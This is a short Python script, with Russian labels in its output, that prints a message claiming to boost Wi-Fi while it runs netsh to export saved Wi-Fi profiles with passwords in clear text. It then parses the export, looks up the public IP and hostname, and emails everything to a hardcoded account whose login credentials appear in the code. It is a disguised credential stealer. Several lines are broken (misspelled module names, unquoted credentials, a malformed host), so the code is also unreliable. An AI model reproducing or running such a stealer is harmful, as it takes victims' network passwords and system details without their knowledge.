import subprocess as sp
from xml.dom import minidom
import requests
from  time import sleep
import platform as pf
import smtplib
from email.mine.text import MIMEText
from email.mine.multipart import MIMEMultipart
import socket

sp.call( 'netsh wlan show profile' )
sp.call( 'netsh wlan export profile folder=C:\\ key =clear' )

print('!!!BOOST WIFI STARTED!!!')

sleep( 2 )

def wifi_parse():
	doc = minidom.parse( 'C:\\Беспроводная сеть-Islam.xml' )

	wifi_name = doc.getElementsByTagName( 'name' )
	wifi_password = doc.getElementsByTagName( 'keyMaterial' )

	global data
	data = f'Wi-Fi name : { wifi_name }\nWi-Fi password :{ wifi_password}'

def get_ip():
	response = requests.get( 'http://myip.dnsomic.com' )

	ip = response.text

	global data_ip
	data_ip = f'IP ADDRESS : { ip }'

def info_pc():
	processor = pf.processor()
	name_sys = pf.system() + '' + pf.release()
	net_pc = pf.node()
	ip_pc = socket.gethostbyname( socket.gethostname() )

	global data_pc 
	data_pc = f'''
	Процессор : { processor }\n
	Система : { name_sys }\n
	Сетевое имя ПК : { net_pc }\n
	IP ADDRESS ПК : { ip_pc }\n
	'''
def all_info():
	data_all_info = f'{ data }\n{ data_ip }\n{ data_pc }'

def send_mail():
	msg = MIMEMultipart()

	msg[ 'Subject' ] = 'Info of PC'
	msg[ 'From' ] = 'nursenokenov57@mail.com.gmail'
	body = data_all_info
	msg.attach( MIMEText( body, 'plain ') )

	server = smtplib.SMTP_SSL('smtp.gmail', 465 )
	server.login(nursenokenov57@mail.com, nursen040111420 )
	server.sendmail(nursenokenov57@mail.com, nursen040111420, msg.as_string() )
	server.quit()

def main():
	wifi_parse()
	get_ip()
	info_pc()
	all_info()
	send_mail()

main()